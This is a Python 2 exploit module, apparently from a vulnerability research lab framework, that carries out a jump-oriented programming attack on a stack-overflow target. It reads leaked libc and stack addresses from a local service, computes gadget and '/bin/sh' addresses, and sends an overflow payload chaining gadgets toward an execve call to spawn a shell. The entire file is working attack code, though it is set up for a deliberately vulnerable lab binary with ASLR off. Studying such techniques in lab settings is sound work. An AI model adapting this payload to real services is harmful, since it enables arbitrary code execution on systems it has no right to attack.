#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'jop'
        self.payload_info = 'DEP ON ASLR OFF'
        self.info = '''Exploit Name : jop
Exploit abstract : Jop eliminates the reliance on the stack and ret instructions
                   seen in return-oriented programming without sacrificing expressive
                   power. This attack still builds and chains functional gadgets,
                   each performing certain primitive operations, except these
                   gadgets end in an indirect branch rather than ret. Without
                   the convenience of using ret to unify them, the attack relies on a
                   dispatcher gadget to dispatch and execute the functional gadgets.
Author : guoyingjie
Support change payload : false'''
        self.property = {'ret':0x0000000000400b1a, #initialize register address
                         'dispatcherAddr':0x0000000000400b1d,# dispatcher gadget address
                         'gadgetaddr':0x0,#the address of first gadget address in stack, initialize 0
                         'data1':0x0000000000000000,
                         'data2':0x000000000000003b,#execv systemcall number
                         'jmp1':0x0000000000103792,#functional gadget address in libc
                         'jmp2':0x0000000000103790,
                         'jmp3':0x000000000008422a,
                         'jmp4':0x0000000000113abd,
                         'jmp5':0x0000000000135086,
                         'jmp6':0x00000000000bb945, 
                         'offset':40, # offset 
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'aslr' : 'off'
                      }
        self.vulnerability= 'vulnerabilities/stack_overflow/code_reuse_jop'

    def run(self):
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        #get new sysaddress here
        s.send('a')      
        recv_data = s.recv(16)
        self.property['sysaddress'] = int(recv_data,16)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print "sysaddress = " + hex(self.property['sysaddress'])
        
        #get rbp
        s.send('b')        
        recv_data1 = s.recv(16) 
        self.property['gadgetaddr'] = int(recv_data1,16)
        print "gadgetaddr = " + hex(self.property['gadgetaddr'])
        gadgetaddr=self.property['gadgetaddr'] + 72

        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

        #get jmp offset
        pop_jmp1_offset = self.property['jmp1'] - libc.symbols['system']
        pop_jmp2_offset = self.property['jmp2'] - libc.symbols['system']
        pop_jmp3_offset = self.property['jmp3'] - libc.symbols['system']
        pop_jmp4_offset = self.property['jmp4'] - libc.symbols['system']
        pop_jmp5_offset = self.property['jmp5'] - libc.symbols['system']
        pop_jmp6_offset = self.property['jmp6'] - libc.symbols['system']
        print "pop_jmp1_offset = " + hex(pop_jmp1_offset)

        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset

        #get jmp address
        pop_jmp1_addr = self.property['sysaddress'] + pop_jmp1_offset
        pop_jmp2_addr = self.property['sysaddress'] + pop_jmp2_offset
        pop_jmp3_addr = self.property['sysaddress'] + pop_jmp3_offset
        pop_jmp4_addr = self.property['sysaddress'] + pop_jmp4_offset
        pop_jmp5_addr = self.property['sysaddress'] + pop_jmp5_offset
        pop_jmp52_addr = self.property['sysaddress'] + pop_jmp5_offset
        pop_jmp6_addr = self.property['sysaddress'] + pop_jmp6_offset
        print "pop_jmp1_addr = " + hex(pop_jmp1_addr)

        #set payload
        payload = "a"*self.property['offset'] + p64(self.property['ret']) + p64(self.property['dispatcherAddr']) + p64(self.property['dispatcherAddr']) + p64(gadgetaddr) + p64(binsh_addr) + p64(self.property['data1']) + p64(self.property['data1']) + p64(self.property['data1']) + p64(self.property['data2']) + p64(pop_jmp1_addr) + p64(pop_jmp2_addr) + p64(pop_jmp3_addr) + p64(pop_jmp4_addr) + p64(pop_jmp5_addr) + p64(pop_jmp52_addr) + p64(pop_jmp6_addr)


        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()
